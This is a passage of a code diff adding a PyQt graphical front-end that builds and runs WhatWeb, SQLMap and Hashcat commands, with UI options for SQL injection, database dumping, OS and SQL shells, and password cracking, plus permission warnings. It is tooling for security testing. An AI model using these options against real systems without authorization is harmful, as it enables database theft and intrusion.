+        controls_layout.addRow("Additional Raw Options:", self.whatweb_extra_opts_edit)
+
+        main_layout.addWidget(controls_frame)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        self.whatweb_start_btn = QPushButton(QIcon("icons/search.svg"), " Start WhatWeb Scan")
+        self.whatweb_stop_btn = QPushButton("Stop WhatWeb"); self.whatweb_stop_btn.setEnabled(False)
+        buttons_layout.addWidget(self.whatweb_start_btn)
+        buttons_layout.addWidget(self.whatweb_stop_btn)
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.whatweb_output_console = QPlainTextEdit()
+        self.whatweb_output_console.setReadOnly(True)
+        self.whatweb_output_console.setFont(QFont("Courier New", 10))
+        self.whatweb_output_console.setPlaceholderText("WhatWeb output will be displayed here...")
+        main_layout.addWidget(self.whatweb_output_console, 1)
+
+        self.whatweb_start_btn.clicked.connect(self.start_whatweb_scan)
+        self.whatweb_stop_btn.clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def start_whatweb_scan(self):
+        """Starts the WhatWeb scan worker thread."""
+        if not shutil.which("whatweb"):
+            QMessageBox.critical(self, "WhatWeb Error", "'whatweb' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target = self.whatweb_target_edit.text().strip()
+        if not target:
+            QMessageBox.critical(self, "Input Error", "A target is required.")
+            return
+
+        command = ["whatweb"]
+
+        # Aggression
+        aggression_level = self.whatweb_aggression_combo.currentText().split(" ")[0]
+        command.extend(["-a", aggression_level])
+
+        # Verbose
+        if self.whatweb_verbose_check.isChecked():
+            command.append("-v")
+
+        # Additional Options
+        if extra_opts := self.whatweb_extra_opts_edit.text().strip():
+            command.extend(extra_opts.split())
+
+        # Target(s) must be last
+        command.extend(target.split())
+
+        self.is_tool_running = True
+        self.whatweb_start_btn.setEnabled(False)
+        self.whatweb_stop_btn.setEnabled(True)
+        self.tool_stop_event.clear()
+        self.whatweb_output_console.clear()
+
+        self.worker = WorkerThread(_whatweb_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _create_sqlmap_tool(self):
+        """Creates the UI for the SQLMap tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>SQLMap: The automatic SQL injection and database takeover tool.</b></font>
+        <p><b>WARNING:</b> This is a powerful attack tool. You MUST have explicit permission to test the target. Ensure you have selected a target URL or provided a request file.</p>
+        """)
+        instructions.setFixedHeight(100)
+        main_layout.addWidget(instructions)
+
+        # --- Main Tab Widget for Options ---
+        sqlmap_tabs = QTabWidget()
+        main_layout.addWidget(sqlmap_tabs)
+
+        # --- Target Tab ---
+        target_tab = QWidget()
+        target_layout = QFormLayout(target_tab)
+        self.sqlmap_url_edit = QLineEdit()
+        self.sqlmap_url_edit.setToolTip('Target URL to test. Must be a full URL including the vulnerable parameter(s).\nExample: "http://testphp.vulnweb.com/listproducts.php?cat=1"')
+        target_layout.addRow("Target URL (-u):", self.sqlmap_url_edit)
+
+        req_file_layout = QHBoxLayout()
+        self.sqlmap_reqfile_edit = QLineEdit()
+        self.sqlmap_reqfile_edit.setToolTip("Load a raw HTTP request from a file (e.g., from Burp Suite).\nThis is often more reliable than using the URL field, especially for complex requests with headers and POST data.")
+        req_file_layout.addWidget(self.sqlmap_reqfile_edit)
+        browse_req_btn = QPushButton("Browse...")
+        browse_req_btn.clicked.connect(self.browse_sqlmap_request_file)
+        req_file_layout.addWidget(browse_req_btn)
+        target_layout.addRow("Request File (-r):", req_file_layout)
+        sqlmap_tabs.addTab(target_tab, "Target")
+
+        # --- Request Tab ---
+        req_tab = QWidget()
+        req_layout = QFormLayout(req_tab)
+        self.sqlmap_method_edit = QLineEdit()
+        req_layout.addRow("Method:", self.sqlmap_method_edit)
+        self.sqlmap_data_edit = QLineEdit(); self.sqlmap_data_edit.setToolTip("POST data to send with the request (--data).")
+        req_layout.addRow("Data (--data):", self.sqlmap_data_edit)
+        self.sqlmap_cookie_edit = QLineEdit(); self.sqlmap_cookie_edit.setToolTip("HTTP Cookie header value (--cookie). Format: 'name=value; name2=value2'.")
+        req_layout.addRow("Cookie (--cookie):", self.sqlmap_cookie_edit)
+        self.sqlmap_useragent_edit = QLineEdit(); self.sqlmap_useragent_edit.setToolTip("Set a custom User-Agent (--user-agent). 'SQLMAP' is the default.")
+        req_layout.addRow("User-Agent (--user-agent):", self.sqlmap_useragent_edit)
+        self.sqlmap_referer_edit = QLineEdit(); self.sqlmap_referer_edit.setToolTip("Set a custom HTTP Referer header (--referer).")
+        req_layout.addRow("Referer (--referer):", self.sqlmap_referer_edit)
+        self.sqlmap_headers_edit = QTextEdit(); self.sqlmap_headers_edit.setToolTip("Extra headers to include in the request (--headers).\nFormat: 'Header1: Value1\\nHeader2: Value2'.")
+        req_layout.addRow("Extra Headers (--headers):", self.sqlmap_headers_edit)
+        self.sqlmap_auth_type_edit = QLineEdit()
+        req_layout.addRow("Auth Type (--auth-type):", self.sqlmap_auth_type_edit)
+        self.sqlmap_auth_cred_edit = QLineEdit()
+        req_layout.addRow("Auth Creds (--auth-cred):", self.sqlmap_auth_cred_edit)
+        self.sqlmap_proxy_edit = QLineEdit()
+        req_layout.addRow("Proxy (--proxy):", self.sqlmap_proxy_edit)
+        self.sqlmap_random_agent_check = QCheckBox("Random Agent (--random-agent)")
+        req_layout.addRow(self.sqlmap_random_agent_check)
+        self.sqlmap_force_ssl_check = QCheckBox("Force SSL (--force-ssl)")
+        req_layout.addRow(self.sqlmap_force_ssl_check)
+        sqlmap_tabs.addTab(req_tab, "Request")
+
+        # --- Injection Tab ---
+        inj_tab = QWidget()
+        inj_layout = QFormLayout(inj_tab)
+        self.sqlmap_test_param_edit = QLineEdit(); self.sqlmap_test_param_edit.setToolTip("Specify a specific parameter to test for SQL injection (-p).")
+        inj_layout.addRow("Test Parameter (-p):", self.sqlmap_test_param_edit)
+        self.sqlmap_dbms_edit = QLineEdit(); self.sqlmap_dbms_edit.setToolTip("Force sqlmap to test for a specific backend DBMS (e.g., MySQL, MSSQL) (--dbms).")
+        inj_layout.addRow("DBMS (--dbms):", self.sqlmap_dbms_edit)
+        self.sqlmap_level_combo = QComboBox()
+        self.sqlmap_level_combo.addItems(["1","2","3","4","5"]); self.sqlmap_level_combo.setToolTip("Level of tests to perform (1-5). Higher levels perform more tests (--level).")
+        inj_layout.addRow("Level (1-5):", self.sqlmap_level_combo)
+        self.sqlmap_risk_combo = QComboBox()
+        self.sqlmap_risk_combo.addItems(["1","2","3"]); self.sqlmap_risk_combo.setToolTip("Risk of tests to perform (1-3). Higher risk tests are more likely to cause issues but may find more vulnerabilities (--risk).")
+        inj_layout.addRow("Risk (1-3):", self.sqlmap_risk_combo)
+        self.sqlmap_technique_edit = QLineEdit("BEUSTQ"); self.sqlmap_technique_edit.setToolTip("Specify the injection techniques to use (--technique).\nB: Boolean-based blind\nE: Error-based\nU: Union query-based\nS: Stacked queries\nT: Time-based blind\nQ: Inline queries")
+        inj_layout.addRow("Techniques (--technique):", self.sqlmap_technique_edit)
+        sqlmap_tabs.addTab(inj_tab, "Injection")
+
+        # --- Enumeration Tab ---
+        enum_tab = QWidget()
+        enum_layout = QVBoxLayout(enum_tab)
+        enum_grid = QGridLayout()
+        self.sqlmap_enum_all_check = QCheckBox("All (-a)"); self.sqlmap_enum_all_check.setToolTip("Enumerate everything (-a).")
+        self.sqlmap_enum_banner_check = QCheckBox("Banner (-b)"); self.sqlmap_enum_banner_check.setToolTip("Retrieve the DBMS banner (-b).")
+        self.sqlmap_enum_current_user_check = QCheckBox("Current User"); self.sqlmap_enum_current_user_check.setToolTip("Retrieve the current DBMS user (--current-user).")
+        self.sqlmap_enum_current_db_check = QCheckBox("Current DB"); self.sqlmap_enum_current_db_check.setToolTip("Retrieve the current database name (--current-db).")
+        self.sqlmap_enum_is_dba_check = QCheckBox("Is DBA?"); self.sqlmap_enum_is_dba_check.setToolTip("Check if the current user is a Database Administrator (--is-dba).")
+        self.sqlmap_enum_passwords_check = QCheckBox("Passwords"); self.sqlmap_enum_passwords_check.setToolTip("Attempt to dump DBMS user password hashes (--passwords).")
+        self.sqlmap_enum_dbs_check = QCheckBox("Databases"); self.sqlmap_enum_dbs_check.setToolTip("Enumerate all databases (--dbs).")
+        self.sqlmap_enum_tables_check = QCheckBox("Tables"); self.sqlmap_enum_tables_check.setToolTip("Enumerate tables in a specific database (--tables).")
+        self.sqlmap_enum_columns_check = QCheckBox("Columns"); self.sqlmap_enum_columns_check.setToolTip("Enumerate columns in a specific table (--columns).")
+        self.sqlmap_enum_schema_check = QCheckBox("Schema"); self.sqlmap_enum_schema_check.setToolTip("Enumerate the entire DBMS schema (--schema).")
+        self.sqlmap_enum_dump_check = QCheckBox("Dump Table Entries"); self.sqlmap_enum_dump_check.setToolTip("Dump entries from a specific table (--dump).")
+        self.sqlmap_enum_dump_all_check = QCheckBox("Dump All"); self.sqlmap_enum_dump_all_check.setToolTip("Dump all table entries from all databases. Warning: this can be very slow.")
+        enum_grid.addWidget(self.sqlmap_enum_all_check, 0, 0)
+        enum_grid.addWidget(self.sqlmap_enum_banner_check, 0, 1)
+        enum_grid.addWidget(self.sqlmap_enum_current_user_check, 0, 2)
+        enum_grid.addWidget(self.sqlmap_enum_current_db_check, 1, 0)
+        enum_grid.addWidget(self.sqlmap_enum_is_dba_check, 1, 1)
+        enum_grid.addWidget(self.sqlmap_enum_passwords_check, 1, 2)
+        enum_grid.addWidget(self.sqlmap_enum_dbs_check, 2, 0)
+        enum_grid.addWidget(self.sqlmap_enum_tables_check, 2, 1)
+        enum_grid.addWidget(self.sqlmap_enum_columns_check, 2, 2)
+        enum_grid.addWidget(self.sqlmap_enum_schema_check, 3, 0)
+        enum_grid.addWidget(self.sqlmap_enum_dump_check, 3, 1)
+        enum_grid.addWidget(self.sqlmap_enum_dump_all_check, 3, 2)
+        enum_layout.addLayout(enum_grid)
+        enum_form_layout = QFormLayout()
+        self.sqlmap_db_edit = QLineEdit(); self.sqlmap_db_edit.setToolTip("Database to use for enumeration (-D).")
+        enum_form_layout.addRow("Database (-D):", self.sqlmap_db_edit)
+        self.sqlmap_tbl_edit = QLineEdit(); self.sqlmap_tbl_edit.setToolTip("Table to use for enumeration (-T).")
+        enum_form_layout.addRow("Table (-T):", self.sqlmap_tbl_edit)
+        self.sqlmap_col_edit = QLineEdit(); self.sqlmap_col_edit.setToolTip("Column to use for enumeration (-C).")
+        enum_form_layout.addRow("Column (-C):", self.sqlmap_col_edit)
+        enum_layout.addLayout(enum_form_layout)
+        sqlmap_tabs.addTab(enum_tab, "Enumeration")
+
+        # --- Access Tab ---
+        access_tab = QWidget()
+        access_layout = QFormLayout(access_tab)
+        self.sqlmap_os_shell_check = QCheckBox("OS Shell (--os-shell)"); self.sqlmap_os_shell_check.setToolTip("Attempt to get an interactive OS shell (--os-shell). This requires a successful file write vulnerability.")
+        access_layout.addRow(self.sqlmap_os_shell_check)
+        self.sqlmap_sql_shell_check = QCheckBox("SQL Shell (--sql-shell)"); self.sqlmap_sql_shell_check.setToolTip("Get an interactive SQL shell (--sql-shell).")
+        access_layout.addRow(self.sqlmap_sql_shell_check)
+        sqlmap_tabs.addTab(access_tab, "Access")
+
+        # --- General Tab ---
+        general_tab = QWidget()
+        general_layout = QFormLayout(general_tab)
+        self.sqlmap_threads_edit = QLineEdit("1"); self.sqlmap_threads_edit.setToolTip("Number of concurrent threads to use (--threads).")
+        general_layout.addRow("Threads (--threads):", self.sqlmap_threads_edit)
+        self.sqlmap_batch_check = QCheckBox("Batch Mode (--batch)"); self.sqlmap_batch_check.setToolTip("Run in batch mode (--batch). Never asks for user input, uses default answers.")
+        general_layout.addRow(self.sqlmap_batch_check)
+        self.sqlmap_flush_session_check = QCheckBox("Flush Session (--flush-session)"); self.sqlmap_flush_session_check.setToolTip("Flush session files for the target, starting fresh (--flush-session).")
+        general_layout.addRow(self.sqlmap_flush_session_check)
+        sqlmap_tabs.addTab(general_tab, "General")
+
+        # --- Additional Options ---
+        main_layout.addWidget(QLabel("Additional Raw Options:"))
+        self.sqlmap_extra_opts_edit = QLineEdit()
+        self.sqlmap_extra_opts_edit.setToolTip("Enter any additional, space-separated SQLMap flags here. These will be appended to the command.")
+        main_layout.addWidget(self.sqlmap_extra_opts_edit)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        self.sqlmap_start_btn = QPushButton(QIcon("icons/search.svg"), " Start SQLMap Scan")
+        self.sqlmap_stop_btn = QPushButton("Stop SQLMap"); self.sqlmap_stop_btn.setEnabled(False)
+        buttons_layout.addWidget(self.sqlmap_start_btn)
+        buttons_layout.addWidget(self.sqlmap_stop_btn)
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.sqlmap_output_console = QPlainTextEdit()
+        self.sqlmap_output_console.setReadOnly(True)
+        self.sqlmap_output_console.setFont(QFont("Courier New", 10))
+        self.sqlmap_output_console.setPlaceholderText("SQLMap output will be displayed here...")
+        main_layout.addWidget(self.sqlmap_output_console, 1)
+
+        self.sqlmap_start_btn.clicked.connect(self.start_sqlmap_scan)
+        self.sqlmap_stop_btn.clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def browse_sqlmap_request_file(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Request File", "", "All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.sqlmap_reqfile_edit.setText(file_path)
+
+    def start_sqlmap_scan(self):
+        """Starts the SQLMap scan worker thread."""
+        if not shutil.which("sqlmap"):
+            QMessageBox.critical(self, "SQLMap Error", "'sqlmap' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        command = ["sqlmap"]
+
+        # --- Target Tab ---
+        url = self.sqlmap_url_edit.text().strip()
+        reqfile = self.sqlmap_reqfile_edit.text().strip()
+        if url:
+            command.extend(["-u", url])
+        elif reqfile:
+            command.extend(["-r", reqfile])
+        else:
+            QMessageBox.critical(self, "Input Error", "A Target URL (-u) or Request File (-r) is required.")
+            return
+
+        # --- Request Tab ---
+        if method := self.sqlmap_method_edit.text().strip(): command.extend(["--method", method])
+        if data := self.sqlmap_data_edit.text().strip(): command.extend(["--data", data])
+        if cookie := self.sqlmap_cookie_edit.text().strip(): command.extend(["--cookie", cookie])
+        if agent := self.sqlmap_useragent_edit.text().strip(): command.extend(["--user-agent", agent])
+        if referer := self.sqlmap_referer_edit.text().strip(): command.extend(["--referer", referer])
+        if headers := self.sqlmap_headers_edit.toPlainText().strip(): command.extend(["--headers", headers])
+        if auth_type := self.sqlmap_auth_type_edit.text().strip(): command.extend(["--auth-type", auth_type])
+        if auth_cred := self.sqlmap_auth_cred_edit.text().strip(): command.extend(["--auth-cred", auth_cred])
+        if proxy := self.sqlmap_proxy_edit.text().strip(): command.extend(["--proxy", proxy])
+        if self.sqlmap_random_agent_check.isChecked(): command.append("--random-agent")
+        if self.sqlmap_force_ssl_check.isChecked(): command.append("--force-ssl")
+
+        # --- Injection Tab ---
+        if test_param := self.sqlmap_test_param_edit.text().strip(): command.extend(["-p", test_param])
+        if dbms := self.sqlmap_dbms_edit.text().strip(): command.extend(["--dbms", dbms])
+        command.extend(["--level", self.sqlmap_level_combo.currentText()])
+        command.extend(["--risk", self.sqlmap_risk_combo.currentText()])
+        if tech := self.sqlmap_technique_edit.text().strip(): command.extend(["--technique", tech])
+
+        # --- Enumeration Tab ---
+        if self.sqlmap_enum_all_check.isChecked(): command.append("-a")
+        if self.sqlmap_enum_banner_check.isChecked(): command.append("-b")
+        if self.sqlmap_enum_current_user_check.isChecked(): command.append("--current-user")
+        if self.sqlmap_enum_current_db_check.isChecked(): command.append("--current-db")
+        if self.sqlmap_enum_is_dba_check.isChecked(): command.append("--is-dba")
+        if self.sqlmap_enum_passwords_check.isChecked(): command.append("--passwords")
+        if self.sqlmap_enum_dbs_check.isChecked(): command.append("--dbs")
+        if self.sqlmap_enum_tables_check.isChecked(): command.append("--tables")
+        if self.sqlmap_enum_columns_check.isChecked(): command.append("--columns")
+        if self.sqlmap_enum_schema_check.isChecked(): command.append("--schema")
+        if self.sqlmap_enum_dump_check.isChecked(): command.append("--dump")
+        if self.sqlmap_enum_dump_all_check.isChecked(): command.append("--dump-all")
+        if db := self.sqlmap_db_edit.text().strip(): command.extend(["-D", db])
+        if tbl := self.sqlmap_tbl_edit.text().strip(): command.extend(["-T", tbl])
+        if col := self.sqlmap_col_edit.text().strip(): command.extend(["-C", col])
+
+        # --- Access Tab ---
+        if self.sqlmap_os_shell_check.isChecked(): command.append("--os-shell")
+        if self.sqlmap_sql_shell_check.isChecked(): command.append("--sql-shell")
+
+        # --- General Tab ---
+        if threads := self.sqlmap_threads_edit.text().strip(): command.extend(["--threads", threads])
+        if self.sqlmap_batch_check.isChecked(): command.append("--batch")
+        if self.sqlmap_flush_session_check.isChecked(): command.append("--flush-session")
+
+        # --- Default flags for GUI operation ---
+        if "--batch" not in command:
+            command.append("--batch")
+        command.extend(["--answers", "quit=N"])
+
+
+        # --- Additional Options ---
+        if extra_opts := self.sqlmap_extra_opts_edit.text().strip():
+            command.extend(extra_opts.split())
+
+        self.is_tool_running = True
+        self.sqlmap_start_btn.setEnabled(False)
+        self.sqlmap_stop_btn.setEnabled(True)
+        self.tool_stop_event.clear()
+        self.sqlmap_output_console.clear()
+
+        self.worker = WorkerThread(_sqlmap_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _sqlmap_thread(self, command):
+        """Worker thread for running the sqlmap command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting SQLMap with command: {' '.join(command)}")
+        q.put(('sqlmap_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.sqlmap_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('sqlmap_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('sqlmap_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'SQLMap Error', "'sqlmap' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"SQLMap thread error: {e}", exc_info=True)
+            q.put(('error', 'SQLMap Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'sqlmap_scan'))
+            with self.thread_finish_lock:
+                self.sqlmap_process = None
+            logging.info("SQLMap scan thread finished.")
+
+    def _create_hashcat_tool(self):
+        """Creates the UI for the Hashcat tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>Hashcat: The world's fastest password cracker.</b></font>
+        <p><b>WARNING:</b> This is a powerful tool. Ensure you have permission to crack the provided hashes. This tool can be very resource-intensive.</p>
+        """)
+        instructions.setFixedHeight(80)
+        main_layout.addWidget(instructions)
+
+        # --- Main Tab Widget for Options ---
+        hashcat_tabs = QTabWidget()
+        main_layout.addWidget(hashcat_tabs)
+
+        # --- Main Config Tab ---
+        config_tab = QWidget()
+        config_layout = QFormLayout(config_tab)
+
+        hashfile_layout = QHBoxLayout()
+        self.hashcat_hashfile_edit = QLineEdit()
+        self.hashcat_hashfile_edit.setToolTip("The file containing the hashes to crack.")
+        hashfile_layout.addWidget(self.hashcat_hashfile_edit)
+        browse_hash_btn = QPushButton("Browse...")
+        browse_hash_btn.clicked.connect(self.browse_hashcat_hashfile)
+        hashfile_layout.addWidget(browse_hash_btn)
+        config_layout.addRow("Hash File:", hashfile_layout)
+
+        hash_type_layout = QVBoxLayout()
+        self.hashcat_type_edit = QLineEdit()
+        self.hashcat_type_edit.setPlaceholderText("e.g., 0 for MD5, 1000 for NTLM")
+        self.hashcat_type_edit.setToolTip("The hash mode code (-m). Click the link below to find the correct mode for your hash type.")
+        hash_type_label = QLabel("Hash Mode (-m):")
+        hash_type_link = QLabel('<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Find Hash Mode</a>')
+        hash_type_link.setOpenExternalLinks(True)
+        hash_type_layout.addWidget(self.hashcat_type_edit)
+        hash_type_layout.addWidget(hash_type_link)
+        config_layout.addRow(hash_type_label, hash_type_layout)
+
+        self.hashcat_attack_mode_combo = QComboBox()
+        self.hashcat_attack_mode_combo.addItems([
+            "0 - Straight (Dictionary)",
+            "1 - Combination",
+            "3 - Brute-force (Mask)",
+            "6 - Hybrid (Wordlist + Mask)",
+            "7 - Hybrid (Mask + Wordlist)"
+        ])
+        self.hashcat_attack_mode_combo.setToolTip("The attack mode (-a) to use.\n- Straight: Dictionary attack.\n- Combination: Combines words from two dictionaries.\n- Brute-force: Tries all possible character combinations based on a mask.\n- Hybrid: Combines dictionary words with a mask.")
+        config_layout.addRow("Attack Mode (-a):", self.hashcat_attack_mode_combo)
+
+        outfile_layout = QHBoxLayout()
+        self.hashcat_outfile_edit = QLineEdit()
+        self.hashcat_outfile_edit.setToolTip("The file to save cracked hashes to (-o).")
+        outfile_layout.addWidget(self.hashcat_outfile_edit)
+        browse_out_btn = QPushButton("Browse...")
+        browse_out_btn.clicked.connect(self.browse_hashcat_outfile)
+        outfile_layout.addWidget(browse_out_btn)
+        config_layout.addRow("Output File (-o):", outfile_layout)
+
+        hashcat_tabs.addTab(config_tab, "Configuration")
+
+        # --- Wordlist Tab ---
+        self.hashcat_wordlist_tab = QWidget()
+        wordlist_layout = QVBoxLayout(self.hashcat_wordlist_tab)
+        self.hashcat_wordlist_list = QListWidget()
+        wordlist_layout.addWidget(self.hashcat_wordlist_list)
+        wordlist_buttons = QHBoxLayout()
+        add_wordlist_btn = QPushButton("Add Wordlist(s)")
+        add_wordlist_btn.clicked.connect(self.browse_hashcat_wordlist)
+        remove_wordlist_btn = QPushButton("Remove Selected")
+        remove_wordlist_btn.clicked.connect(lambda: self.hashcat_wordlist_list.takeItem(self.hashcat_wordlist_list.currentRow()))
+        wordlist_buttons.addWidget(add_wordlist_btn)
+        wordlist_buttons.addWidget(remove_wordlist_btn)
+        wordlist_layout.addLayout(wordlist_buttons)
+        hashcat_tabs.addTab(self.hashcat_wordlist_tab, "Wordlists")
+
+        # --- Mask Tab ---
+        self.hashcat_mask_tab = QWidget()
+        mask_layout = QFormLayout(self.hashcat_mask_tab)
+        self.hashcat_mask_edit = QLineEdit()
+        self.hashcat_mask_edit.setPlaceholderText("e.g., ?l?l?l?l?l?l?l?l")
+        self.hashcat_mask_edit.setToolTip("The mask to use for brute-force or hybrid attacks. Click the link below for syntax details.")
+        mask_layout.addRow("Mask:", self.hashcat_mask_edit)
+        mask_link = QLabel('<a href="https://hashcat.net/wiki/doku.php?id=mask_attack">Mask Attack Info</a>')
+        mask_link.setOpenExternalLinks(True)
+        mask_layout.addRow(mask_link)
+        hashcat_tabs.addTab(self.hashcat_mask_tab, "Mask")
+
+        # --- Advanced Tab ---
+        adv_tab = QWidget()
+        adv_layout = QFormLayout(adv_tab)
+        self.hashcat_force_check = QCheckBox("Ignore warnings")
+        self.hashcat_force_check.setToolTip("Ignore warnings and force the cracking session to start (--force).")
+        adv_layout.addRow("Force:", self.hashcat_force_check)
+        self.hashcat_extra_opts_edit = QLineEdit()
+        self.hashcat_extra_opts_edit.setToolTip("Enter any additional, space-separated Hashcat flags here. These will be appended to the command.")
+        adv_layout.addRow("Additional Options:", self.hashcat_extra_opts_edit)
+        adv_tab.setLayout(adv_layout)
+        hashcat_tabs.addTab(adv_tab, "Advanced")
+
+        # --- UI Logic ---
+        def update_tabs(text):
+            mode = int(text.split(" ")[0])
+            self.hashcat_wordlist_tab.setEnabled(mode in [0, 1, 6, 7])
+            self.hashcat_mask_tab.setEnabled(mode in [3, 6, 7])
+        self.hashcat_attack_mode_combo.currentTextChanged.connect(update_tabs)
+        update_tabs(self.hashcat_attack_mode_combo.currentText()) # Initial state
+
+        # --- Action Buttons & Output ---
+        buttons_layout = QHBoxLayout()
+        self.hashcat_start_btn = QPushButton(QIcon("icons/tool.svg"), " Start Hashcat")
+        self.hashcat_stop_btn = QPushButton("Stop Hashcat"); self.hashcat_stop_btn.setEnabled(False)
+        buttons_layout.addWidget(self.hashcat_start_btn)
+        buttons_layout.addWidget(self.hashcat_stop_btn)
+        main_layout.addLayout(buttons_layout)
+
+        self.hashcat_output_console = QPlainTextEdit()
+        self.hashcat_output_console.setReadOnly(True)
+        self.hashcat_output_console.setFont(QFont("Courier New", 10))
+        main_layout.addWidget(self.hashcat_output_console, 1)
+
+        self.hashcat_start_btn.clicked.connect(self.start_hashcat_scan)
+        self.hashcat_stop_btn.clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def browse_hashcat_hashfile(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select Hash File", "", "All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.hashcat_hashfile_edit.setText(file_path)
+
+    def browse_hashcat_wordlist(self):
+        file_paths, _ = QFileDialog.getOpenFileNames(self, "Select Wordlist(s)", "", "Text Files (*.txt);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        for file_path in file_paths:
+            if file_path:
+                self.hashcat_wordlist_list.addItem(file_path)
+
+    def browse_hashcat_outfile(self):
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Output File", "", "Text Files (*.txt);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            self.hashcat_outfile_edit.setText(file_path)
+
+    def start_hashcat_scan(self):
+        """Starts the Hashcat worker thread."""
+        if not shutil.which("hashcat"):
+            QMessageBox.critical(self, "Hashcat Error", "'hashcat' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        command = ["hashcat"]
+
+        # --- Config Tab ---
+        hashfile = self.hashcat_hashfile_edit.text().strip()
+        if not hashfile:
+            QMessageBox.critical(self, "Input Error", "Hash file is required.")
+            return
+        command.append(hashfile)
+
+        hash_type = self.hashcat_type_edit.text().strip()
+        if not hash_type:
+            QMessageBox.critical(self, "Input Error", "Hash mode (-m) is required.")
+            return
+        command.extend(["-m", hash_type])
+
+        attack_mode = self.hashcat_attack_mode_combo.currentText().split(" ")[0]
+        command.extend(["-a", attack_mode])
+
+        if outfile := self.hashcat_outfile_edit.text().strip():
+            command.extend(["-o", outfile])
+
+        # --- Wordlist/Mask Tabs ---
+        if self.hashcat_wordlist_tab.isEnabled():
+            wordlists = [self.hashcat_wordlist_list.item(i).text() for i in range(self.hashcat_wordlist_list.count())]
+            if not wordlists:
+                QMessageBox.critical(self, "Input Error", "This attack mode requires at least one wordlist.")
+                return
+            command.extend(wordlists)
+
+        if self.hashcat_mask_tab.isEnabled():
+            mask = self.hashcat_mask_edit.text().strip()
+            if not mask:
+                QMessageBox.critical(self, "Input Error", "This attack mode requires a mask.")
+                return
+            command.append(mask)
+
+        # --- Advanced Tab ---
+        if self.hashcat_force_check.isChecked():
+            command.append("--force")
+        if extra_opts := self.hashcat_extra_opts_edit.text().strip():
+            command.extend(extra_opts.split())
+
+        self.is_tool_running = True
+        self.hashcat_start_btn.setEnabled(False)
+        self.hashcat_stop_btn.setEnabled(True)
+        self.tool_stop_event.clear()
+        self.hashcat_output_console.clear()
+
+        self.worker = WorkerThread(_hashcat_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _hashcat_thread(self, command):
+        """Worker thread for running the hashcat command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Hashcat with command: {' '.join(command)}")
+        q.put(('hashcat_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.hashcat_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('hashcat_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('hashcat_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'Hashcat Error', "'hashcat' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Hashcat thread error: {e}", exc_info=True)
+            q.put(('error', 'Hashcat Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'hashcat_scan'))
+            with self.thread_finish_lock:
+                self.hashcat_process = None
+            logging.info("Hashcat scan thread finished.")
+
+    def _create_nuclei_tool(self):
+        """Creates the UI for the Nuclei Web Scanner tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.nuclei_controls = self._create_nuclei_config_widget()
+        main_layout.addWidget(config_widget)
+
+        controls = self.nuclei_controls
+
+        # --- Action Buttons ---
